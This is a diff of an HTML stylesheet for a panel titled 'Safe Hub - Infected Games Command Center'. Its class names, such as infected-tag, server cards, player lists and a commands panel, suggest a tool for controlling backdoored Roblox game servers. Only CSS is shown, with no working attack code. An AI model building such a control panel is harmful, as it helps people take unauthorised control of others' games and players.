@@ -1,1545 +1,2449 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe Hub - Infected Games Command Center</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-        }
-
-        body {
-            background: #0b0e14;
-            min-height: 100vh;
-            display: flex;
-        }
-
-        .sidebar {
-            width: 200px;
-            background: #0f131a;
-            border-right: 1px solid #1a222e;
-            padding: 20px 14px;
-            height: 100vh;
-            position: sticky;
-            top: 0;
-            overflow-y: auto;
-            flex-shrink: 0;
-        }
-
-        .sidebar-brand {
-            padding: 4px 8px;
-            margin-bottom: 24px;
-        }
-
-        .sidebar-brand h2 {
-            color: #e8edf5;
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-
-        .sidebar-brand h2 span {
-            color: #ff465a;
-        }
-
-        .sidebar-brand .sub {
-            color: #5a6a7a;
-            font-size: 10px;
-            margin-top: 2px;
-        }
-
-        .sidebar-brand .badge-side {
-            display: inline-block;
-            background: rgba(255, 70, 90, 0.12);
-            color: #ff465a;
-            font-size: 9px;
-            font-weight: 600;
-            padding: 2px 12px;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 70, 90, 0.15);
-            margin-top: 6px;
-        }
-
-        .nav-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 8px 12px;
-            border-radius: 8px;
-            color: #7a879a;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 2px;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .nav-item:hover {
-            background: #1a222e;
-            color: #e8edf5;
-        }
-
-        .nav-item.active {
-            background: #1a222e;
-            color: #e8edf5;
-            border-left: 3px solid #2d6bff;
-        }
-
-        .nav-item .icon {
-            width: 18px;
-            text-align: center;
-            font-size: 16px;
-        }
-
-        .nav-item .count {
-            margin-left: auto;
-            background: #1a222e;
-            padding: 0px 8px;
-            border-radius: 12px;
-            font-size: 10px;
-            color: #5a6a7a;
-        }
-
-        .nav-item.active .count {
-            background: #2d6bff;
-            color: #ffffff;
-        }
-
-        .nav-divider {
-            height: 1px;
-            background: #1a222e;
-            margin: 10px 8px;
-        }
-
-        .sidebar-footer {
-            margin-top: 20px;
-            padding: 10px;
-            border-top: 1px solid #1a222e;
-            color: #3a4555;
-            font-size: 10px;
-            text-align: center;
-        }
-
-        .sidebar-footer .status-online {
-            color: #28a745;
-        }
-
-        .sidebar-footer .key-expiry {
-            color: #ffc107;
-            font-size: 9px;
-            margin-top: 4px;
-        }
-
-        .main-content {
-            flex: 1;
-            padding: 20px 28px;
-            overflow-y: auto;
-            min-width: 0;
-            max-height: 100vh;
-        }
-
-        .main-content::-webkit-scrollbar {
-            width: 4px;
-        }
-
-        .main-content::-webkit-scrollbar-track {
-            background: #0b0e14;
-        }
-
-        .main-content::-webkit-scrollbar-thumb {
-            background: #2a3340;
-            border-radius: 4px;
-        }
-
-        .main-content::-webkit-scrollbar-thumb:hover {
-            background: #3a4555;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .header-left h1 {
-            color: #e8edf5;
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .header-left p {
-            color: #7a879a;
-            font-size: 13px;
-            margin-top: 2px;
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-
-        .stats-badge {
-            background: #141a22;
-            padding: 6px 16px;
-            border-radius: 8px;
-            border: 1px solid #212a34;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .stats-badge .stat {
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            color: #a0b0c8;
-            font-size: 12px;
-        }
-
-        .stats-badge .stat .number {
-            color: #e8edf5;
-            font-weight: 600;
-        }
-
-        .btn {
-            background: #2a3340;
-            color: #e8edf5;
-            border: 1px solid #3a4555;
-            padding: 6px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 500;
-            transition: all 0.2s;
-        }
-
-        .btn:hover {
-            background: #354052;
-            border-color: #4a5a6a;
-            transform: translateY(-1px);
-        }
-
-        .btn-primary {
-            background: #2d6bff;
-            border-color: #2d6bff;
-        }
-
-        .btn-primary:hover {
-            background: #3b78ff;
-            border-color: #3b78ff;
-        }
-
-        .btn-success {
-            background: #28a745;
-            border-color: #28a745;
-        }
-
-        .btn-success:hover {
-            background: #34b854;
-            border-color: #34b854;
-        }
-
-        .btn-danger {
-            background: #dc3545;
-            border-color: #dc3545;
-        }
-
-        .btn-danger:hover {
-            background: #e74c5e;
-            border-color: #e74c5e;
-        }
-
-        .btn-warning {
-            background: #ffc107;
-            border-color: #ffc107;
-            color: #0b0e14;
-        }
-
-        .btn-warning:hover {
-            background: #ffcd2e;
-            border-color: #ffcd2e;
-        }
-
-        .btn-purple {
-            background: #6f42c1;
-            border-color: #6f42c1;
-        }
-
-        .btn-purple:hover {
-            background: #7b4fd4;
-            border-color: #7b4fd4;
-        }
-
-        .last-update {
-            color: #5a6a7a;
-            font-size: 11px;
-            margin-top: 2px;
-        }
-
-        .page {
-            display: none;
-        }
-
-        .page.active {
-            display: block;
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 340px;
-            gap: 20px;
-            align-items: start;
-        }
-
-        .servers-section {
-            min-width: 0;
-        }
-
-        .commands-section {
-            min-width: 0;
-        }
-
-        .section-title {
-            color: #e8edf5;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .section-title .count {
-            color: #7a879a;
-            font-size: 12px;
-            font-weight: 400;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 12px;
-        }
-
-        .server-card {
-            background: #141a22;
-            border-radius: 10px;
-            padding: 14px 16px;
-            border: 1px solid #212a34;
-            transition: all 0.25s ease;
-            position: relative;
-        }
-
-        .server-card:hover {
-            border-color: #3a4a5a;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
-        }
-
-        .server-card.online {
-            border-left: 3px solid #28a745;
-        }
-
-        .server-card.offline {
-            border-left: 3px solid #dc3545;
-            opacity: 0.5;
-        }
-
-        .server-card.shutting-down {
-            border-left: 3px solid #ffc107;
-            opacity: 0.7;
-        }
-
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 4px;
-        }
-
-        .game-name {
-            color: #e8edf5;
-            font-size: 16px;
-            font-weight: 600;
-        }
-
-        .game-name .infected-tag {
-            color: #ff465a;
-            font-size: 10px;
-            font-weight: 500;
-            margin-left: 6px;
-            background: rgba(255, 70, 90, 0.1);
-            padding: 1px 10px;
-            border-radius: 12px;
-            border: 1px solid rgba(255, 70, 90, 0.15);
-        }
-
-        .server-name {
-            color: #7a879a;
-            font-size: 12px;
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 10px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            padding: 2px 10px;
-            border-radius: 12px;
-        }
-
-        .status-indicator.online {
-            color: #28a745;
-            background: rgba(40, 167, 69, 0.08);
-            border: 1px solid rgba(40, 167, 69, 0.15);
-        }
-
-        .status-indicator.offline {
-            color: #dc3545;
-            background: rgba(220, 53, 69, 0.08);
-            border: 1px solid rgba(220, 53, 69, 0.15);
-        }
-
-        .status-indicator.shutting-down {
-            color: #ffc107;
-            background: rgba(255, 193, 7, 0.08);
-            border: 1px solid rgba(255, 193, 7, 0.15);
-        }
-
-        .status-dot {
-            width: 6px;
-            height: 6px;
-            border-radius: 50%;
-            display: inline-block;
-        }
-
-        .status-dot.online {
-            background: #28a745;
-            animation: pulse-dot 2s infinite;
-        }
-
-        .status-dot.offline {
-            background: #dc3545;
-        }
-
-        .status-dot.shutting-down {
-            background: #ffc107;
-            animation: pulse-dot 1s infinite;
-        }
-
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .details-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin: 8px 0 0 0;
-            padding: 8px 0 0 0;
-            border-top: 1px solid #1e2632;
-        }
-
-        .detail-item {
-            display: flex;
-            flex-direction: column;
-            gap: 1px;
-        }
-
-        .detail-item .label {
-            color: #5a6a7a;
-            font-size: 9px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            font-weight: 600;
-        }
-
-        .detail-item .value {
-            color: #e8edf5;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .detail-item .value .sub {
-            color: #7a879a;
-            font-weight: 400;
-            font-size: 11px;
-        }
-
-        .player-list {
-            margin-top: 8px;
-            padding-top: 8px;
-            border-top: 1px solid #1e2632;
-        }
-
-        .player-list .title {
-            color: #5a6a7a;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .player-tags {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 4px;
-        }
-
-        .player-tag {
-            background: #1a222e;
-            color: #b0c0d8;
-            padding: 2px 10px;
-            border-radius: 14px;
-            font-size: 11px;
-            border: 1px solid #26303e;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .player-tag:hover {
-            background: #26303e;
-            border-color: #3a4a5a;
-        }
-
-        .player-tag.selected {
-            background: #2d6bff;
-            border-color: #2d6bff;
-            color: #ffffff;
-        }
-
-        .card-actions {
-            display: flex;
-            gap: 6px;
-            margin-top: 10px;
-            padding-top: 10px;
-            border-top: 1px solid #1e2632;
-            flex-wrap: wrap;
-        }
-
-        .card-actions .btn {
-            flex: 1;
-            text-align: center;
-            padding: 4px 10px;
-            font-size: 10px;
-            min-width: 60px;
-        }
-
-        .commands-panel {
-            background: #141a22;
-            border-radius: 10px;
-            padding: 18px 20px;
-            border: 1px solid #212a34;
-            position: sticky;
-            top: 20px;
-        }
-
-        .commands-panel .panel-title {
-            color: #e8edf5;
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 2px;
-        }
-
-        .commands-panel .panel-subtitle {
-            color: #7a879a;
-            font-size: 12px;
-            margin-bottom: 14px;
-        }
-
-        .form-group {
-            margin-bottom: 10px;
-        }
-
-        .form-group label {
-            display: block;
-            color: #a0b0c8;
-            font-size: 10px;
-            font-weight: 500;
-            margin-bottom: 3px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-
-        .form-group select,
-        .form-group input,
-        .form-group textarea {
-            width: 100%;
-            padding: 6px 10px;
-            background: #1a222e;
-            border: 1px solid #2a3340;
-            border-radius: 6px;
-            color: #e8edf5;
-            font-size: 12px;
-            transition: all 0.2s;
-        }
-
-        .form-group select:focus,
-        .form-group input:focus,
-        .form-group textarea:focus {
-            outline: none;
-            border-color: #2d6bff;
-            background: #1e2632;
-        }
-
-        .form-group select option {
-            background: #141a22;
-        }
-
-        .form-group textarea {
-            resize: vertical;
-            min-height: 40px;
-            font-family: inherit;
-        }
-
-        .command-buttons {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 6px;
-            margin-top: 12px;
-        }
-
-        .command-buttons .btn {
-            padding: 6px 10px;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.2px;
-        }
-
-        .command-buttons .btn-full {
-            grid-column: 1 / -1;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 30px 20px;
-            color: #5a6a7a;
-        }
-
-        .empty-state .icon {
-            font-size: 32px;
-            margin-bottom: 10px;
-            opacity: 0.3;
-        }
-
-        .empty-state h3 {
-            color: #8a9aaa;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .empty-state p {
-            font-size: 12px;
-            margin-top: 2px;
-        }
-
-        .footer {
-            margin-top: 20px;
-            text-align: center;
-            color: #3a4555;
-            font-size: 11px;
-            border-top: 1px solid #1a222e;
-            padding-top: 14px;
-        }
-
-        .footer .safe-hub {
-            color: #28a745;
-            font-weight: 600;
-        }
-
-        /* Key Expiry Modal */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-
-        .modal-overlay.active {
-            display: flex;
-        }
-
-        .modal {
-            background: #141a22;
-            padding: 40px;
-            border-radius: 12px;
-            border: 1px solid #2a3340;
-            max-width: 450px;
-            width: 90%;
-            text-align: center;
-        }
-
-        .modal h2 {
-            color: #ff465a;
-            font-size: 22px;
-            margin-bottom: 12px;
-        }
-
-        .modal p {
-            color: #a0b0c8;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .modal .btn {
-            padding: 10px 30px;
-            font-size: 14px;
-        }
-
-        @media (max-width: 1024px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            .sidebar {
-                width: 160px;
-                padding: 14px 10px;
-            }
-            .main-content {
-                padding: 14px;
-            }
-            .commands-panel {
-                position: static;
-            }
-        }
-
-        @media (max-width: 768px) {
-            body {
-                flex-direction: column;
-            }
-            .sidebar {
-                width: 100%;
-                height: auto;
-                position: static;
-                border-right: none;
-                border-bottom: 1px solid #1a222e;
-                padding: 10px 14px;
-            }
-            .sidebar-brand {
-                margin-bottom: 10px;
-            }
-            .nav-items {
-                display: flex;
-                flex-wrap: wrap;
-                gap: 4px;
-            }
-            .nav-item {
-                padding: 6px 12px;
-                flex: 1;
-                min-width: 70px;
-                justify-content: center;
-                font-size: 11px;
-            }
-            .nav-item .count {
-                display: none;
-            }
-            .nav-divider {
-                display: none;
-            }
-            .sidebar-footer {
-                display: none;
-            }
-            .main-content {
-                padding: 12px;
-                max-height: none;
-            }
-            .header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .header-right {
-                width: 100%;
-            }
-            .stats-badge {
-                flex-wrap: wrap;
-                width: 100%;
-                justify-content: space-between;
-            }
-            .details-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-            .command-buttons {
-                grid-template-columns: 1fr;
-            }
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            .card-actions {
-                flex-wrap: wrap;
-            }
-            .card-actions .btn {
-                flex: 1 1 40%;
-                min-width: 60px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .sidebar-brand h2 {
-                font-size: 16px;
-            }
-            .main-content {
-                padding: 10px;
-            }
-            .header-left h1 {
-                font-size: 18px;
-            }
-            .stats-badge {
-                gap: 8px;
-                padding: 4px 10px;
-            }
-            .stats-badge .stat {
-                font-size: 10px;
-            }
-            .server-card {
-                padding: 10px 12px;
-            }
-            .game-name {
-                font-size: 14px;
-            }
-            .details-grid {
-                grid-template-columns: 1fr 1fr;
-                gap: 4px;
-            }
-            .detail-item .value {
-                font-size: 11px;
-            }
-            .commands-panel {
-                padding: 12px 14px;
-            }
-            .form-group select,
-            .form-group input {
-                padding: 5px 8px;
-                font-size: 11px;
-            }
-            .command-buttons .btn {
-                font-size: 10px;
-                padding: 5px 8px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Safe Hub — Command Center</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #020617;
+      --surface: #0b1221;
+      --surface-2: #111a2e;
+      --surface-3: #1a2542;
+      --border: rgba(148, 163, 184, 0.1);
+      --border-strong: rgba(148, 163, 184, 0.15);
+      --text: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --text-dim: #64748b;
+      --accent: #38bdf8;
+      --accent-glow: rgba(56, 189, 248, 0.25);
+      --success: #22c55e;
+      --success-glow: rgba(34, 197, 94, 0.25);
+      --danger: #f43f5e;
+      --danger-glow: rgba(244, 63, 94, 0.25);
+      --warning: #f59e0b;
+      --warning-glow: rgba(245, 158, 11, 0.25);
+      --radius: 16px;
+      --radius-sm: 12px;
+      --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    ::-webkit-scrollbar { width: 8px; height: 8px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #334155; }
+
+    /* --- AMBIENT BACKGROUND --- */
+    .ambient-glow {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .ambient-glow::before,
+    .ambient-glow::after {
+      content: '';
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(120px);
+      opacity: 0.15;
+      animation: drift 20s ease-in-out infinite;
+    }
+
+    .ambient-glow::before {
+      width: 600px; height: 600px;
+      background: var(--accent);
+      top: -10%; left: -5%;
+    }
+
+    .ambient-glow::after {
+      width: 500px; height: 500px;
+      background: var(--danger);
+      bottom: -10%; right: -5%;
+      animation-delay: -10s;
+    }
+
+    @keyframes drift {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33% { transform: translate(30px, -50px) scale(1.1); }
+      66% { transform: translate(-20px, 20px) scale(0.9); }
+    }
+
+    /* ========================================================
+       LANDING PAGE
+       ======================================================== */
+    .landing-page {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      position: relative;
+      z-index: 1;
+    }
+
+    .landing-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.25rem 2rem;
+      border-bottom: 1px solid var(--border);
+      background: rgba(2, 6, 23, 0.7);
+      backdrop-filter: blur(16px);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .landing-logo {
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+    }
+
+    .landing-logo span { color: var(--danger); }
+
+    .landing-nav-btns {
+      display: flex;
+      gap: 0.75rem;
+    }
+
+    .landing-hero {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 4rem 2rem;
+    }
+
+    .hero-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: rgba(56, 189, 248, 0.08);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      color: var(--accent);
+      font-size: 0.8rem;
+      font-weight: 700;
+      padding: 0.4rem 1rem;
+      border-radius: 999px;
+      margin-bottom: 2rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .hero-eyebrow .dot {
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent);
+      animation: pulse-dot 2s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    .hero-title {
+      font-size: clamp(2.5rem, 6vw, 5rem);
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      line-height: 1.05;
+      margin-bottom: 1.25rem;
+    }
+
+    .hero-title span {
+      background: linear-gradient(135deg, var(--accent), var(--danger));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .hero-sub {
+      font-size: 1.2rem;
+      color: var(--text-secondary);
+      max-width: 560px;
+      line-height: 1.6;
+      margin-bottom: 2.5rem;
+    }
+
+    .hero-btns {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-bottom: 3rem;
+    }
+
+    .btn-hero-primary {
+      padding: 0.9rem 2rem;
+      background: linear-gradient(135deg, #2563eb, var(--accent));
+      border: none;
+      border-radius: 999px;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 10px 25px -5px rgba(37, 99, 235, 0.3);
+    }
+
+    .btn-hero-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 20px 40px -8px rgba(37, 99, 235, 0.4);
+    }
+
+    .btn-hero-ghost {
+      padding: 0.9rem 2rem;
+      background: transparent;
+      border: 1px solid var(--border-strong);
+      border-radius: 999px;
+      color: var(--text);
+      font-size: 1rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .btn-hero-ghost:hover {
+      background: var(--surface);
+      border-color: rgba(148, 163, 184, 0.25);
+    }
+
+    .hero-features {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      justify-content: center;
+      max-width: 600px;
+    }
+
+    .hero-feature {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: var(--text-secondary);
+      font-size: 0.875rem;
+      font-weight: 500;
+    }
+
+    .hero-feature .check {
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: rgba(34, 197, 94, 0.12);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      display: grid;
+      place-items: center;
+      color: var(--success);
+      font-size: 0.65rem;
+      flex-shrink: 0;
+    }
+
+    /* ========================================================
+       AUTH MODALS
+       ======================================================== */
+    .auth-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(12px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 300;
+      padding: 1rem;
+    }
+
+    .auth-overlay.active { display: flex; }
+
+    .auth-box {
+      background: linear-gradient(180deg, rgba(17, 26, 46, 0.98), rgba(11, 18, 33, 0.98));
+      border: 1px solid var(--border-strong);
+      border-radius: var(--radius);
+      padding: 2.5rem 2rem;
+      width: 100%;
+      max-width: 440px;
+      position: relative;
+      overflow: hidden;
+      animation: modalIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: var(--shadow);
+    }
+
+    .auth-box::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent), transparent);
+      opacity: 0.6;
+    }
+
+    @keyframes modalIn {
+      from { opacity: 0; transform: scale(0.92) translateY(20px); }
+      to { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    .auth-close {
+      position: absolute;
+      top: 1rem; right: 1rem;
+      background: none;
+      border: none;
+      color: var(--text-dim);
+      cursor: pointer;
+      font-size: 1.2rem;
+      width: 32px; height: 32px;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      transition: all 0.2s;
+    }
+
+    .auth-close:hover { background: var(--surface-2); color: var(--text); }
+
+    .auth-title {
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.35rem;
+    }
+
+    .auth-title span { color: var(--danger); }
+
+    .auth-sub {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      margin-bottom: 1.75rem;
+      font-weight: 500;
+    }
+
+    .roblox-link-section {
+      margin-top: 1.25rem;
+      padding-top: 1.25rem;
+      border-top: 1px solid var(--border);
+    }
+
+    .roblox-link-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      margin-bottom: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .roblox-input-row {
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .roblox-avatar {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      background: rgba(56, 189, 248, 0.06);
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      border-radius: 12px;
+      padding: 0.75rem 1rem;
+      margin-top: 0.75rem;
+    }
+
+    .roblox-avatar-icon {
+      width: 40px; height: 40px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--accent), #2563eb);
+      display: grid;
+      place-items: center;
+      font-size: 1.1rem;
+      flex-shrink: 0;
+    }
+
+    .roblox-avatar-name {
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    .roblox-avatar-sub {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 0.1rem;
+    }
+
+    /* ========================================================
+       SHARED FORM & BUTTON STYLES
+       ======================================================== */
+    .form-group { margin-bottom: 1rem; }
+    .form-group label {
+      display: block;
+      color: var(--text-secondary);
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 0.5rem;
+    }
+
+    .form-group select,
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      background: rgba(2, 6, 23, 0.5);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: var(--text);
+      font-size: 0.95rem;
+      font-family: inherit;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      outline: none;
+    }
+
+    .form-group select:focus,
+    .form-group input:focus,
+    .form-group textarea:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 4px var(--accent-glow);
+      background: rgba(2, 6, 23, 0.7);
+    }
+
+    .form-group select option { background: var(--surface-2); }
+
+    .btn-sm {
+      padding: 0.45rem 1rem;
+      border-radius: 10px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      border: 1px solid var(--border);
+      background: var(--surface);
+      color: var(--text-secondary);
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: inherit;
+    }
+
+    .btn-sm:hover {
+      background: var(--surface-2);
+      color: var(--text);
+      border-color: var(--border-strong);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+
+    .btn-sm.primary {
+      background: linear-gradient(135deg, #2563eb, var(--accent));
+      border-color: transparent;
+      color: #fff;
+    }
+
+    .btn-sm.primary:hover { box-shadow: 0 8px 20px rgba(37, 99, 235, 0.35); transform: translateY(-2px); }
+
+    .btn-sm.danger {
+      background: linear-gradient(135deg, #e11d48, var(--danger));
+      border-color: transparent;
+      color: #fff;
+    }
+
+    .btn-sm.danger:hover { box-shadow: 0 8px 20px rgba(244, 63, 94, 0.35); transform: translateY(-2px); }
+
+    .btn-sm.success {
+      background: linear-gradient(135deg, #16a34a, var(--success));
+      border-color: transparent;
+      color: #fff;
+    }
+
+    .btn-sm.success:hover { box-shadow: 0 8px 20px rgba(34, 197, 94, 0.35); transform: translateY(-2px); }
+
+    .btn-sm.warning {
+      background: linear-gradient(135deg, #d97706, var(--warning));
+      border-color: transparent;
+      color: #fff;
+    }
+
+    .btn-sm.warning:hover { box-shadow: 0 8px 20px rgba(245, 158, 11, 0.35); transform: translateY(-2px); }
+
+    .btn-full { width: 100%; text-align: center; padding: 0.75rem; }
+
+    .status-msg {
+      font-size: 0.9rem;
+      margin-bottom: 0.75rem;
+      display: none;
+      padding: 0.75rem 1rem;
+      border-radius: 12px;
+      font-weight: 600;
+      animation: slideIn 0.3s ease;
+    }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .status-msg.error {
+      display: block;
+      color: #fda4af;
+      background: rgba(244, 63, 94, 0.12);
+      border: 1px solid rgba(244, 63, 94, 0.2);
+    }
+
+    .status-msg.success {
+      display: block;
+      color: #86efac;
+      background: rgba(34, 197, 94, 0.12);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+    }
+
+    .status-msg.construction {
+      display: block;
+      color: #fcd34d;
+      background: rgba(245, 158, 11, 0.12);
+      border: 1px solid rgba(245, 158, 11, 0.2);
+    }
+
+    /* ========================================================
+       DASHBOARD
+       ======================================================== */
+    .dashboard {
+      display: none;
+      flex-direction: column;
+      min-height: 100vh;
+      width: 100%;
+      position: relative;
+      z-index: 1;
+    }
+
+    .dashboard.active { display: flex; }
+
+    /* --- SIDEBAR --- */
+    .sidebar-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(4px);
+      z-index: 100;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .sidebar-overlay.open { display: block; opacity: 1; }
+
+    .sidebar {
+      position: fixed;
+      top: 0; left: -280px;
+      width: 260px; height: 100%;
+      background: linear-gradient(180deg, rgba(15,23,42,0.98), rgba(2,6,23,0.98));
+      border-right: 1px solid var(--border);
+      padding: 1.5rem;
+      z-index: 101;
+      transition: left 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      backdrop-filter: blur(12px);
+    }
+
+    .sidebar.open { left: 0; }
+
+    .sidebar-brand { padding-bottom: 1.5rem; margin-bottom: 1.25rem; border-bottom: 1px solid var(--border); }
+    .sidebar-brand h3 { font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em; }
+    .sidebar-brand h3 span { color: var(--danger); }
